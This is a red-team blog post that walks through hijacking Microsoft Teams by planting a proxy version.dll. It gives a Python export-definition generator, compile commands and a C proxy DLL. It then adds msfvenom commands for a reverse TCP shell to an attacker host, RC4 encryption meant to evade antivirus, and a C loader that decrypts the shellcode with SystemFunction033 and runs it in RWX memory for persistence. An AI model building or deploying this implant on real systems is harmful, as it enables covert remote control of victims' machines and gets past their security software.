---
title: "Windows DLL Hijacking via Proxying"
layout: "post"
categories: "Windows"
tags: ["Red Team"]
---

Hello everyone, this blog will be short and to the point. I plan to cover the process of performing DLL hijacking by proxying a valid DLL. This method is commonly employed by attackers for privilege escalation or to maintain persistence on a Windows machine. While developers can also use this technique to add plug-ins to programs ([https://en.wikipedia.org/wiki/Plug-in_(computing)](https://en.wikipedia.org/wiki/Plug-in_(computing))), I won't delve into the background of DLL proxying in this blog, as there are already many articles that cover every detail.

I will be following along with the instructions provided in this GitHub repository: [https://github.com/tothi/dll-hijack-by-proxying/tree/master](https://github.com/tothi/dll-hijack-by-proxying/tree/master), utilizing the same technique. The introduction given on GitHub succinctly explains why adversaries opt for DLL proxying instead of just performing DLL hijacking. In brief, DLL proxying is the easiest way to load arbitrary code into an application without causing it to crash after your code is executed. This is achieved by creating a DLL wrapper ([https://en.wikipedia.org/wiki/Wrapper_library](https://en.wikipedia.org/wiki/Wrapper_library)) that exposes the same functions as those exported by the valid DLL library.\
\
In this blog post, I will demonstrate DLL Hijacking on the Teams application. The initial step involves installing Process Monitor from [https://docs.microsoft.com/en-us/sysinternals/downloads/procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) on your Windows machine. Subsequently, run the Teams application while monitoring it with Procmon.

Proceed by adding filters in Procmon with the following criteria: 'Process Name is Teams.exe, Operation is CreateFile, Path contains dll, and Result is NAME NOT FOUND.' Once the changes are applied, you will observe multiple results of Teams attempting to perform a CreateFile operation on DLLs that do not exist in the specified path.

![](/assets/posts/2023-12-10-windows-dll-hijacking-via-proxying/dll_proxy_procmon.bmp)

This is a common issue in Microsoft applications because developers often neglect to specify a path when attempting operations on a DLL. This problem bears similarity to relative path issues in Linux.

In cases where a path isn't specified, Microsoft applications rely on the DLL Search Order. Sektor7 provides a quick video highlighting this issue at [https://institute.sektor7.net/view/courses/rto-windows-persistence/311170-low-privilege-persistence/886839-dll-proxying-introduction](https://institute.sektor7.net/view/courses/rto-windows-persistence/311170-low-privilege-persistence/886839-dll-proxying-introduction). In our example, as shown above, the application directory lacks the version.dll. However, it is present in the System32 directory. Still, this comes after the application's directory in the search order.\
\
Now, proceed to copy the legitimate version.dll to your Kali machine. I also suggest copying the Teams executable from the application folder. Afterward, rename version.dll to version\_1.dll. Examining the image below, we can observe that this is a common naming convention for DLLs on Windows.

![](/assets/posts/2023-12-10-windows-dll-hijacking-via-proxying/dll_proxy_app_directory.bmp)

Next, we need to construct a DLL wrapper containing the exported functions from the valid version library. In the image below from IDA, we can identify the exported functions that will be required.

![](/assets/posts/2023-12-10-windows-dll-hijacking-via-proxying/dll_proxy_ida.bmp)

In alignment with the initial GitHub instructions, we can generate a .def file to define the export functions we aim to expose in the proxy DLL. Subsequently, we will utilize this .def file during the compilation of our proxy DLL. The code for the .def generator and the proxy DLL is provided below.

```python
#!/usr/bin/env python3

import pefile
import argparse
import os.path

def export_functions(dll_path):
    dll = pefile.PE(dll_path)
    dll_basename = os.path.splitext(dll_path)[0]

    with open('version.def', 'w') as output_file:
        output_file.write("EXPORTS\n")
        for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
            if export.name:
                line = '{}={}.{} @{}\n'.format(export.name.decode(), dll_basename, export.name.decode(), export.ordinal)
                output_file.write(line)

def main():
    parser = argparse.ArgumentParser(description='Generate version.def file for proxy wrapper')
    parser.add_argument('dll_path', help='Path to the DLL')
    args = parser.parse_args()

    export_functions(args.dll_path)
    print("Exported functions written to version.def")

if __name__ == "__main__":
    main()

```

```c
#include <windows.h>
#include <stdio.h>

void Run_Code()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    char cmd[] = "C:\\Windows\\System32\\calc.exe";

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        
        // Handle error (use GetLastError() to get the error code)
        DWORD error = GetLastError();
        printf("CreateProcess failed with error %lu\n", error);
    }
    else {

        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Write to a file indicating successful loading
        FILE* file = fopen("LoadedSuccessfully.txt", "w");
        if (file != NULL) {
            fprintf(file, "DLL Loaded Successfully!\n");
            fclose(file);
        }
        else {
            // Handle file writing error
            printf("Failed to write to file\n");
        }
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Run_Code();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

```bash
file Teams.exe
python3 generate_def.py version_1.dll
x86_64-w64-mingw32-gcc -shared -o version.dll version.c version.def -s
```

![](/assets/posts/2023-12-10-windows-dll-hijacking-via-proxying/dll_proxy_compile.bmp)

Prior to compiling the proxy DLL, we verified the architecture of the Teams binary. Given that it is a 64-bit binary, we compiled the proxy DLL accordingly. All seems well, and we are prepared to transfer both the original DLL and the proxy DLL into the application folder. Upon running Teams through the Windows search bar, Calculator pops up, and the Teams application doesn't crash!


![](/assets/posts/2023-12-10-windows-dll-hijacking-via-proxying/dll_proxy_calc.bmp)


\
We will now delve into executing shellcode in the proxy DLL instead of merely running the calculator. In this blog, we'll illustrate how to obtain a reverse shell to maintain persistence. However, this technique is not exclusive to attackers; Windows developers can also leverage it when adding plugins to applications.

Given that we'll be covering the use of Metasploit shellcode in this blog, an anti-virus (AV) bypass is necessary. A method that has gained popularity recently involves utilizing Windows API functions SystemFunction032/SystemFunction033 to perform RC4 decryption of shellcode in memory before executing it. It's worth noting that many AV providers are incorporating detection mechanisms for software employing this function to prevent potential malware threats ([https://support.eset.com/en/ca8496-eset-customer-advisory-modules-review-june-2023](https://support.eset.com/en/ca8496-eset-customer-advisory-modules-review-june-2023)).

While acknowledging that attackers may exploit it maliciously, the original intent of these functions was to offer on-the-fly decryption for developers. An article detailing how Windows incorporated cryptographic routines into various system library calls, eliminating the need for CryptoAPI, can be found here: [https://web.archive.org/web/20230607111201/https://blog.gentilkiwi.com/tag/systemfunction032](https://web.archive.org/web/20230607111201/https://blog.gentilkiwi.com/tag/systemfunction032). The function has gained popularity through the Mimikatz tool, but the article explains that internal Windows components also used those system library calls.\
\
The next step is to generate RC4-encrypted Metasploit code. I have provided the commands below.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Attacker IP> LPORT=1234 EXITFUNC=thread -a x64 --platform windows -f raw -o raw_tcp.bin

openssl enc -rc4 -in raw_tcp.bin -K `echo -n 'HelpMeWinlezPlz?' | xxd -p` -nosalt > encrypted.bin

xxd -i encrypted.bin | tee shellcode.txt | head -n 10
```

![](/assets/posts/2023-12-10-windows-dll-hijacking-via-proxying/proxy_dll_shellcode.bmp)


Now we can add the `encrypted_bin` array to our new proxy DLL. In our updated code, we need to create a thread to run our code. When a DLL is loaded into a process, the operating system calls the DLL's entry-point function `DllMain` with the `DLL_PROCESS_ATTACH` flag. This occurs in the context of the main thread of the process. If the operations performed in `DllMain` take a significant amount of time or have the potential to block or delay the initialization of the main thread, it can impact the responsiveness of the application.

Running our code directly in the main thread caused the Teams application to be blocked and not load properly. By creating a new thread to execute our code, we allow the main thread to continue its initialization without being blocked, thus executing our code in the background. I have included the updated code for `version.c` below.


```c
#include <windows.h>

char keyBuf[] = {'H', 'e', 'l', 'p', 'M', 'e', 'W', 'i', 'n', 'l', 'e', 'z', 'P', 'l', 'z', '?'};

typedef struct USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

#define STATUS_PROCEDURE_NOT_FOUND ((NTSTATUS)0xC000007A)

NTSTATUS SystemFunction033(USTRING* memoryRegion, USTRING* keyPointer) {
    typedef NTSTATUS(WINAPI* SystemFunction033Func)(USTRING*, USTRING*);
    HMODULE hModule = LoadLibraryW(L"Advapi32");
    if (hModule == NULL) {
        // Handle error loading the library
        return STATUS_DLL_NOT_FOUND;
    }

    SystemFunction033Func SystemFunction033 = (SystemFunction033Func)GetProcAddress(hModule, "SystemFunction033");
    if (SystemFunction033 == NULL) {
        // Handle error getting the function pointer
        FreeLibrary(hModule);
        return STATUS_PROCEDURE_NOT_FOUND;
    }

    // Call SystemFunction033
    NTSTATUS status = SystemFunction033(memoryRegion, keyPointer);

    // Clean up
    FreeLibrary(hModule);
    return status;
}

DWORD WINAPI RunCodeThread(LPVOID lpParam) {
    // Key string
    USTRING keyString;
    keyString.Buffer = keyBuf;
    keyString.Length = sizeof(keyBuf);
    keyString.MaximumLength = sizeof(keyBuf);

    // Encrypted shellcode
    unsigned char encrypted_bin[] = {
        // Place encrypted shellcode here
    };

    size_t size = sizeof(encrypted_bin);

    // Current process
    DWORD tProcess = GetCurrentProcessId();

    // Open process
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess);
    if (pHandle == NULL) {
        // Handle error opening process
        return 1;
    }

    // Allocate memory in the process
    LPVOID rPtr = VirtualAllocEx(pHandle, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (rPtr == NULL) {
        // Handle error allocating memory
        CloseHandle(pHandle);
        return 1;
    }

    // Copy shellcode to the allocated memory
    if (!WriteProcessMemory(pHandle, rPtr, encrypted_bin, size, NULL)) {
        // Handle error writing to process memory
        VirtualFreeEx(pHandle, rPtr, 0, MEM_RELEASE); 
        CloseHandle(pHandle);
        return 1;
    }

    // Memory region
    USTRING shellcodeRegion;
    shellcodeRegion.Buffer = rPtr;
    shellcodeRegion.Length = size;
    shellcodeRegion.MaximumLength = size;

    // Decrypt memory region with SystemFunction033
    NTSTATUS status = SystemFunction033(&shellcodeRegion, &keyString);
    if (status != 0) {
        // Handle error in SystemFunction033
        VirtualFreeEx(pHandle, rPtr, 0, MEM_RELEASE); 
        CloseHandle(pHandle);
        return 1;
    }

    // Change memory protections of the allocated region to allow execution
    DWORD oldProtect;
    if (!VirtualProtectEx(pHandle, rPtr, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        // Handle error changing memory protection
        VirtualFreeEx(pHandle, rPtr, 0, MEM_RELEASE); 
        CloseHandle(pHandle);
        return 1;
    }

    // Execute the decrypted shellcode pointed to by rPtr as a function.
    ((void(*)())rPtr)();

    // Close process handle
    CloseHandle(pHandle);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        // Create a new thread for Run_Code
        CreateThread(NULL, 0, RunCodeThread, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}

```

![](/assets/posts/2023-12-10-windows-dll-hijacking-via-proxying/dll_proxy_shell.bmp)

\
The final step is to compile the proxy DLL using the same command as before and transfer it to the Windows machine in the Teams application folder. When we run Teams from the start menu, the Teams application will load properly, and we will receive a reverse shell!

In conclusion, I hope this blog proves helpful for both red team members and developers interested in performing DLL proxying to achieve code execution without causing the executable that loads the DLL to crash. Thanks, everyone, for taking the time to read the blog, and see you next time!
